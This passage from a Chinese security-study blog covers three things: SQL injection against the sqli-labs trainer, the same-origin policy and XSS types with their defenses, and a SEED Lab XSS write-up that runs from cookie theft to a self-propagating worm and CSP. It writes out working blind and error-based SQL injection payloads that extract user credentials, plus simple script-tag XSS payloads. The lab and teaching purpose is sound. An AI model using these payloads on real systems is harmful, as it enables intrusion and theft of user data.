class="hljs-number">1</span>张表的表名的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-9</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr((select table_name from information_schema.tables where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; limit 0,1),1,1)=&#x27;</span><span class="hljs-string">e&#x27;,sleep(5),1)--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜users表的全部字段名</p><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>个字段名的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-9</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr((select column_name from information_schema.columns where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),1,1)=&#x27;</span>i<span class="hljs-string">&#x27;,sleep(5),1)--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">105</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜users表username和password字段的全部值</p><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>组数据的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-9</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr((select concat_ws(&#x27;</span>,<span class="hljs-string">&#x27;,username,password) from security.users limit 0,1),1,1)=&#x27;</span>D<span class="hljs-string">&#x27;,sleep(5),1)--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;,&#x27;</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></blockquote></li></ol><h1 id="http头部注入">6. HTTP头部注入</h1><h2 id="原理-6">6.1 原理</h2><ul><li><p>有时候，后台开发人员为了验证客户端HTTPHeader（比如常用的Cookie验证等）或者通过HTTPHeader头信息获取客户端的一些信息（比如User-Agent、Accept字段等），会对客户端HTTPHeader进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTPHeader的注入漏洞。</p></li><li><p>常见的HTTPHeader注入类型包括Cookie注入、Referer注入、User-Agent注入、XFF注入等(注入位置)。</p></li></ul><h2 id="注入流程-5">6.2 注入流程</h2><ol type="1"><li><p>寻找注入点,判断注入类型（字符 or 数字）</p></li><li><p>获取网站当前所在数据库的库名（使用基于报错的注入方法）</p><blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>sqli-labs Less-<span class="hljs-number">18</span><br>User-Agent:Mozilla<span class="hljs-regexp">/5.0......Firefox/</span><span class="hljs-number">46.0</span><span class="hljs-string">&#x27; and extractvalue(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,database())),&#x27;</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取数据库security的全部表名</p><blockquote><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">User-Agent:Mozilla/<span class="hljs-number">5.0</span>......Firefox/<span class="hljs-number">46.0&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>))),<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表的全部字段名</p><blockquote><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">User-Agent:Mozilla/<span class="hljs-number">5.0</span>......Firefox/<span class="hljs-number">46.0&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span>))),<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表id、username和password字段的全部值</p><blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>第一行数据<br>User-Agent:Mozilla<span class="hljs-regexp">/5.0......Firefox/</span><span class="hljs-number">46.0</span><span class="hljs-string">&#x27; and extractvalue(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select concat_ws(&#x27;</span>,<span class="hljs-string">&#x27;,id,username,password) from security.users limit 0,1))),&#x27;</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure></blockquote></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH5-Web安全-XSS攻击</title>
    <link href="/2023/10/31/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E7%90%86%E8%AE%BA%E7%AF%87/05Web%E5%AE%89%E5%85%A8-XSS%E6%94%BB%E5%87%BB/"/>
    <url>/2023/10/31/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/%E7%90%86%E8%AE%BA%E7%AF%87/05Web%E5%AE%89%E5%85%A8-XSS%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="同源策略">1. 同源策略</h1><h3 id="含义">1.1 含义</h3><p>1995年，同源政策由 Netscape公司引入浏览器。目前，所有浏览器都实行这个政策。最初，它的含义是指，A网页设置的Cookie，B网页不能打开，除非这两个网页"同源"。所谓"同源"指的是"三个相同"：</p><blockquote><ul><li>协议相同</li><li>域名相同</li><li>端口相同</li></ul></blockquote><p>举例来说，<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略）。它的同源情况如下：</p><blockquote><ul><li><code>http://www.example.com/dir2/other.html</code>：同源</li><li><code>http://example.com/dir/other.html</code>：不同源（域名不同）</li><li><code>http://v2.www.example.com/dir/other.html</code>：不同源（域名不同）</li><li><code>http://www.example.com:81/dir/other.html</code>：不同源（端口不同）</li></ul></blockquote><h3 id="目的">1.2 目的</h3><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的Cookie，会发生什么？</p><p>很显然，如果 Cookie包含隐私（比如存款总额），这些信息就会泄漏。更可怕的是，Cookie往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。</p><p>由此可见，"同源政策"是必需的，否则 Cookie可以共享，互联网就毫无安全可言了。</p><h3 id="限制范围">1.3 限制范围</h3><p>随着互联网的发展，"同源政策"越来越严格。目前，如果非同源，共有三种行为受到限制。</p><blockquote><p>（1） Cookie、LocalStorage 和 IndexDB 无法读取。</p><p>（2） DOM 无法获得。</p><p>（3） AJAX 请求不能发送。</p></blockquote><p>虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面，我将详细介绍，如何规避上面三种限制。</p><h1 id="cookie">2. Cookie</h1><p>Cookie是服务器写入浏览器的一小段信息，只有同源的网页才能共享。但是，两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置<code>document.domain</code>共享Cookie。</p><p>举例来说，A网页是<code>http://w1.example.com/a.html</code>，B网页是<code>http://w2.example.com/b.html</code>，那么只要设置相同的<code>document.domain</code>，两个网页就可以共享Cookie。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">domain</span> = <span class="hljs-string">&#x27;example.com&#x27;</span>;<br></code></pre></td></tr></table></figure></blockquote><p>现在，A网页通过脚本设置一个 Cookie。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;test1=hello&quot;</span>;<br></code></pre></td></tr></table></figure></blockquote><p>B网页就可以读到这个 Cookie。</p><blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> allCookie = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;<br></code></pre></td></tr></table></figure></blockquote><p>注意，这种方法只适用于 Cookie 和 iframe 窗口，LocalStorage 和 IndexDB无法通过这种方法，规避同源政策，而要使用下文介绍的PostMessage API。</p><p>另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如<code>.example.com</code>。</p><blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>key=value; domain=.example.com; path=/<br></code></pre></td></tr></table></figure></blockquote><p>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。</p><h1 id="xss攻击">3. XSS攻击</h1><h2 id="概述">3.1 概述</h2><p>跨站脚本攻击（Cross-SiteScripting，简称XSS攻击）出现在上世纪90年代中，由于跨站脚本攻击的缩写和层叠样式表（CascadingStyleSheets，CSS）的缩写一样，为了防止混淆，故缩写成XSS攻击。XSS攻击是由于Web应用程序对用户输入过滤不足而产生的，使得攻击者输入的特定数据变成了JavaScript脚本或HTML代码。</p><h2 id="分类">3.2 分类</h2><h3 id="反射型xss">3.2.1 反射型XSS</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310312040585.png"alt="image-20231031202501135" /><figcaption aria-hidden="true">image-20231031202501135</figcaption></figure><p>反射型XSS是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：<code>&lt;?php echo "&lt;p&gt;hello, $_GET['user']&lt;/p&gt;";?&gt;</code>，那么在访问时设置<code>/?user=&lt;/p&gt;&lt;script&gt;alert("hack")&lt;/script&gt;&lt;p&gt;</code>，则可执行预设好的JavaScript代码。</p><p>反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSSAuditor、NoScript等防御手段的影响较大。</p><p>特点：</p><ul><li>非持久型、参数型跨站脚本</li><li>恶意脚本附加到URL地址参数中</li></ul><p>攻击技巧：生成短网址隐藏具体内容</p><h3 id="存储型xss">3.2.2 存储型XSS</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310312040586.png"alt="image-20231031201645055" /><figcaption aria-hidden="true">image-20231031201645055</figcaption></figure><p>储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。</p><p>特点：</p><ul><li>持久型</li><li>一般攻击存在留言、评论、博客日志中</li><li>恶意脚本被存储在服务端的数据库中</li></ul><h3 id="dom型xss">3.2.3 DOM型XSS</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310312040587.png"alt="image-20231031202521509" /><figcaption aria-hidden="true">image-20231031202521509</figcaption></figure><p>DOM型XSS是基于DOM文档对象模型的一种漏洞。严格地说，DOM型XSS其实算反射型XSS，区别在于DOM型XSS并不会和后台进行交互，是完完全全的Web前端安全问题，要做防御也只能在客户端上进行防御。</p><p>首先，客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它并不与服务端进行交互而是从客户端获得DOM中的数据（如从URL中获取数据）并在本地执行；其次，浏览器用户可以操纵DOM中的一些对象如URL、location等；因此，当攻击者可以控制一些DOM对象、输入一些恶意JS代码，而客户端的脚本并没有对用户输入内容进行有效的过滤就传入一些执行危险操纵的函数如eval等或直接输出到页面时，就会导致DOM型XSS漏洞的存在。</p><h3 id="区别">3.2.4 区别</h3><p><strong>一、被攻击对象的不同</strong>反射型XSS的被攻击对象一般是攻击者去寻找的，就比如说：一个攻击者想盗取A的QQ号，那么攻击者就可以将一个含有反射型XSS的URL链接给A，此时我们可以看出，需要将特定的URL，注意是特定的URL给A，当A点击进入链接时，就受到XSS攻击，所以这种攻击范围不是特别的广。</p><p>而存储型XSS是广撒网的方式或者指定的方式，就是攻击者将存储型XSS放在一些有XSS漏洞的网站上，只要有用户访问这个链接就会中招，而攻击者也可以寻找被攻击对象，比如说上面的例子，所以我们可以看出，存储型XSS的危害性更大，范围更广，可以不需要寻找被攻击对象，只要存储型XSS在服务器上就能实施攻击。</p><p>DOM型XSS的被攻击对象其实和反射型XSS被攻击对象差不多，就是给攻击对象放送URL。</p><p><strong>二、解析位置不同（个人感觉是反射型与存储型区别的本质）</strong>反射型XSS的脚本被解析的地方是浏览器，而存储型XSS的脚本被解析的地方是服务器，DOM型XSS也是浏览器，所以DOM型又叫DOM反射型XSS。但是反射型XSS需要联网，而DOM型不需要！</p><p><strong>三、存储时间不同</strong>反射型XSS是既有即用，没有持久性，而存储型XSS是存储在服务器上，只要服务器不挂机或者是被干掉，就一直会有，DOM型XSS和反射型差不多。</p><p><strong>四、允许输入点的不同（这是DOM型与其他两种的区别）</strong>一般情况下，反射型XSS在搜索框啊，或者是页面跳转啊这些地方，而存储型XSS一般是留言，或者用户存储的地方，而DOM呢？是在DOM位置上，不取决于输入环境上。</p><h2 id="攻击方式">3.3 攻击方式</h2><ul><li>cookie窃取</li><li>会话劫持：利用XSS攻击，冒用合法者的会话ID进行网络访问的一种攻击方式</li><li>网络钓鱼：可以执行JavaScript代码动态生成网页内容或直接注入HTML代码，从而产生网络钓鱼攻击</li><li>信息刺探：访问历史信息、端口信息、剪贴板内容、客户端IP地址、键盘信息等</li><li>网页挂马：将恶意脚本隐藏在Web网页中，当用户浏览该网页时，这些隐藏的恶意脚本将在用户不知情的情况下执行，下载并启动木马程序</li><li>XSS蠕虫：一般利用存储型XSS攻击，将一段JavaScript代码保存在服务器上，其他用户浏览相关信息时，会执行JavaScript代码，从而引发攻击</li></ul><h2 id="防范措施">3.4 防范措施</h2><ul><li>HttpOnly是另一个应用给cookie的标志，而且所有现代浏览器都支持它。HttpOnly标志的用途是指示浏览器禁止任何脚本访问cookie内容，这样就可以降低通过JavaScript发起的XSS攻击偷取cookie的风险。</li><li>安全编码：PHP语言中针对XSS攻击的安全编码函数有htmlentities和htmlspecialchars等，这些函数对特殊字符的安全编码方式如下：小于号（&lt;）转换成&amp;lt、大于号（&gt;）转换成&amp;gt、与符号（&amp;）转换成&amp;amp、双引号（"）转换成&amp;quot、单引号（'）转换成&amp;#39。</li></ul><p>参考教程：</p><ol type="1"><li>https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html</li><li>https://websec.readthedocs.io/zh/latest/vuln/xss/classify.html</li><li>https://m.freebuf.com/articles/web/318982.html</li><li>https://cloud.tencent.com/developer/article/2076505</li></ol>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Cross-Site Scripting Attack Lab</title>
    <link href="/2023/10/31/SEED-LABS/Web%20Security/Cross-Site%20Scripting%20Attack%20Lab/"/>
    <url>/2023/10/31/SEED-LABS/Web%20Security/Cross-Site%20Scripting%20Attack%20Lab/</url>
    
    <content type="html"><![CDATA[<h1 id="overview">1. Overview</h1><p>跨站脚本攻击（XSS）是一种常见于web应用程序中的计算机安全漏洞.此漏洞使攻击者有可能将恶意代码（如JavaScripts）注入受害者的web浏览器.利用这些恶意代码，攻击者可以窃取受害者的凭证，如会话cookie.浏览器为保护这些凭据而采用的访问控制策略（如同源策略）可被利用XSS 漏洞绕过.</p><h1 id="lab-tasks">2. Lab Tasks</h1><h2id="task-1-posting-a-malicious-message-to-display-an-alert-window">2.1Task 1: Posting a Malicious Message to Display an Alert Window</h2><ol type="1"><li>登录攻击者（如Boby）账户，编辑profile，在BriefDescription处插入xss代码(<code>&lt;script&gt;alter("this is a xss")&lt;/script&gt;</code>)，点击保存.</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952898.png"alt="image-20231031192429127" /><figcaption aria-hidden="true">image-20231031192429127</figcaption></figure><ol start="2" type="1"><li><p>登录受害者（如Samy）账户，查看Boby个人信息，成功显示弹窗，xss攻击生效.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952899.png"alt="image-20231031192540811" /><figcaption aria-hidden="true">image-20231031192540811</figcaption></figure></li><li><p>如果想运行一个较长的JavaScript，但又受限于表单中可输入的字符数，可以将 JavaScript程序存储在一个独立js文件中，然后在<code>&lt;script&gt;</code>标记中使用<code>src</code> 属性来引用它.</p></li></ol><h2 id="task-2-posting-a-malicious-message-to-display-cookies">2.2 Task2: Posting a Malicious Message to Display Cookies</h2><ol type="1"><li><p>基础知识：<code>document.cookie</code> 是 JavaScript中用于操作浏览器中的 cookie 的属性，允许 JavaScript 读取和写入浏览器中的cookie.</p></li><li><p>登录攻击者（如Samy）账户，编辑profile，在BriefDescription处插入xss代码(<code>&lt;script&gt;alter(document.cookie)&lt;/script&gt;</code>)，点击保存.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952900.png"alt="image-20231031193026135" /><figcaption aria-hidden="true">image-20231031193026135</figcaption></figure></li><li><p>登录受害者（如Boby）账户，查看Samy个人信息，成功显示弹窗，内容为cookie值，xss攻击生效.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952901.png"alt="image-20231031192826864" /><figcaption aria-hidden="true">image-20231031192826864</figcaption></figure></li></ol><h2 id="task-3-stealing-cookies-from-the-victims-machine">2.3 Task 3:Stealing Cookies from the Victim’s Machine</h2><ol type="1"><li><p>基础知识：当 JavaScript 插入 img 标签时，浏览器会尝试从src字段中的 URL 加载图片，这会导致向攻击者的机器发送 HTTP GET请求；document.write 是 JavaScript中用于将文本内容插入到网页的方法.它允许在网页上动态生成内容，并将其输出到页面的位置.</p></li><li><p>攻击者（如Boby）在本地开启监听.nc参数说明：-l 侦听连接；-v输出更多信息；-n 禁用DNS解析，即不会尝试将 IP 地址转换为主机名；-k当一个连接完成时，监听另一个连接.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952902.png"alt="image-20231031193313293" /><figcaption aria-hidden="true">image-20231031193313293</figcaption></figure></li><li><p>攻击者（Boby）在个人信息BriefDescription处插入xss代码，点击保存.注意：IP地址为攻击者接收cookie的IP.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952903.png"alt="image-20231031193408766" /><figcaption aria-hidden="true">image-20231031193408766</figcaption></figure></li><li><p>受害者（如Samy）查看Boby个人信息，攻击者（Boby）在netcat输出信息中成功得到Samy的cookie.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952904.png"alt="image-20231031193433871" /><figcaption aria-hidden="true">image-20231031193433871</figcaption></figure></li></ol><h2 id="task-4-becoming-the-victims-friend">2.4 Task 4: Becoming theVictim’s Friend</h2><ol type="1"><li><p>抓包查看正常添加Samy为好友时的HTTP请求信息.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952905.png"alt="image-20231031193517639" /><figcaption aria-hidden="true">image-20231031193517639</figcaption></figure></li><li><p>攻击者（Samy）根据正常请求编写xss代码，用于伪造请求添加好友，并将xss代码放至“Aboutme”区域，此处需要先选中"EditHTML"（文本模式）.代码流程：使用XMLHttpRequest对象构建并发送HTTPGET请求到一个特定的URL（sendurl），以完成添加Samy作为好友的操作.friend参数：用于标识Samy.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952906.png"alt="image-20231031193612175" /><figcaption aria-hidden="true">image-20231031193612175</figcaption></figure></li><li><p>受害者（Boby）访问Samy的个人主页，网页自动发起请求添加Samy，可以看到此时已经添加成功.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952907.png"alt="image-20231031193703403" /><figcaption aria-hidden="true">image-20231031193703403</figcaption></figure></li><li><p>问题一：ts可能是时间戳信息，用于安全验证或防止重放攻击；token可能是令牌信息，以进行身份验证或授权检查.每次请求时它们都是针对CSRF的安全措施，会动态变化，如果不添加这两个参数，无法实现认证，也就不能成功执行请求内容.</p></li><li><p>问题二：不能.以编辑器模式提交的xss代码被引入了code等标签，内容不会被作为代码执行.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952908.png"alt="image-20231031193743679" /><figcaption aria-hidden="true">image-20231031193743679</figcaption></figure></li></ol><h2 id="task-5-modifying-the-victims-profile">2.5 Task 5: Modifying theVictim’s Profile</h2><ol type="1"><li><p>基础知识："application/x-www-form-urlencoded" 使用 URL编码来表示数据，其中数据被编码为键值对，并使用 "&amp;"符号分隔键值对.例如，键值对 "name=John&amp;age=30" 表示名字为"John"，年龄为 "30" 的数据.</p></li><li><p>抓包查看正常修改“Aboutme”时的HTTP请求信息，获取到请求的url，以及发送的参数信息.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952909.png"alt="image-20231031193925006" /><figcaption aria-hidden="true">image-20231031193925006</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952910.png"alt="image-20231031193936065" /><figcaption aria-hidden="true">image-20231031193936065</figcaption></figure></li><li><p>攻击者（Samy）根据正常请求编写xss代码，用于伪造请求修改受害者的个人信息，并将xss代码放至“Aboutme”区域，此处需要先选中"EditHTML"（文本模式）.代码流程：获取当前用户的用户名、唯一标识符、时间戳和安全令牌；构建一个包含用户信息和其他数据的请求内容；检查当前用户的唯一标识符是否与指定值（59：Samy）不同；如果唯一标识符不同，创建一个HTTP POST 请求，将请求内容发送到指定的 URL.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952911.png"alt="image-20231031194020786" /><figcaption aria-hidden="true">image-20231031194020786</figcaption></figure></li><li><p>受害者（Boby）访问Samy的个人主页后，自身个人信息“Aboutme”被修改.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952912.png"alt="image-20231031194054556" /><figcaption aria-hidden="true">image-20231031194054556</figcaption></figure></li><li><p>问题三：防止攻击者（Samy）自己的“Aboutme”被修改.如果去掉这行代码，在攻击者保存输入的xss代码后，自身的“Aboutme”立即被改变，无法对别人实施攻击.</p></li></ol><h2 id="task-6-writing-a-self-propagating-xss-worm">2.6 Task 6: Writinga Self-Propagating XSS Worm</h2><ol type="1"><li><p>实现方法：方式一：Link方法.先将蠕虫文件上传至网站，然后使用<code>&lt;script&gt;</code>标记中的<code>src</code>属性来包含蠕虫；方式二：DOM方法. 使用 DOM API从网页中获取自己的副本.（本例中采用第二种方式进行实现）</p></li><li><p>攻击者（Samy）根据正常请求编写xss代码，用于伪造请求修改受害者的个人信息，并可以作为蠕虫传播，然后将xss代码放至“Aboutme”区域，此处需要先选中"Edit HTML"（文本模式）.代码流程：使用DOMAPI获取自身副本，需要添加<code>&lt;script&gt;</code>标签开始和结束部分，因为通过<code>document.getElementById("worm")</code>获取得是页面中id 为 "worm" 的 <code>&lt;script&gt;</code>标签内的JavaScript代码；基于task5编写修改个人信息模块，只需将嵌入内容换成wormCode；复用task4中添加samy为好友模块.注：因为使用POST方法发送数据，且Content-Type设置为<code>application/x-wwwform-url</code>，所以需要使用<code>encodedencodeURICom()</code>函数对wormCode进行URL 编码.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952913.png"alt="image-20231031194237332" /><figcaption aria-hidden="true">image-20231031194237332</figcaption></figure></li><li><p>受害者1（Boby）访问Samy个人主页，出现弹窗，自动添加Samy为好友，自身个人信息被修改，xss攻击成功.注：此处使用弹窗显示源码是为演示方便，实际攻击中可将此行代码删除.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952914.png"alt="image-20231031194311134" /><figcaption aria-hidden="true">image-20231031194311134</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952915.png"alt="image-20231031194325051" /><figcaption aria-hidden="true">image-20231031194325051</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952916.png"alt="image-20231031194336805" /><figcaption aria-hidden="true">image-20231031194336805</figcaption></figure></li><li><p>受害者2（Alice）访问Boby个人主页，也出现弹窗，自动添加Samy为好友，自身个人信息被修改，xss攻击成功传播.</p></li></ol><h2 id="task-7-defeating-xss-attacks-using-csp">2.7 Task 7: DefeatingXSS Attacks Using CSP</h2><ol type="1"><li><p>example32a.com：JS代码全部执行成功，因为未开启任何防护措施.b)；example32b.com:4和6成功执行，因为Apache配置文件规定允许从同一域名加载脚本，同时也允许从<em>.example70.com 这个域名加载脚本；example32c.com:1,4和6成功执行,因为web应用程序（php代码）中设置允许从同一域名加载脚本，同时也允许从</em>.example70.com 这个域名加载脚本.此外，它还引入了一个 nonce（numberused once），允许该值为“111-111-111”的脚本执行.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952917.png"alt="image-20231031194634833" /><figcaption aria-hidden="true">image-20231031194634833</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952918.png"alt="image-20231031194642984" /><figcaption aria-hidden="true">image-20231031194642984</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952919.png"alt="image-20231031194701042" /><figcaption aria-hidden="true">image-20231031194701042</figcaption></figure></li><li><p>点击网站中的按钮.example32a.com:弹出JS代码执行成功的窗口，因为没有CSP保护；example32b.com和example32c.com:未执行，因为开启了CSP保护.</p></li><li><p>修改Apache配置文件.进入./Labsetup/image_www/apache_csp.conf，在example32b.com中删除条目self,增加条目*.example60.com.重建镜像，启动容器.打开example32b.com，区域5和6显示OK.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310311952920.png"alt="image-20231031194908558" 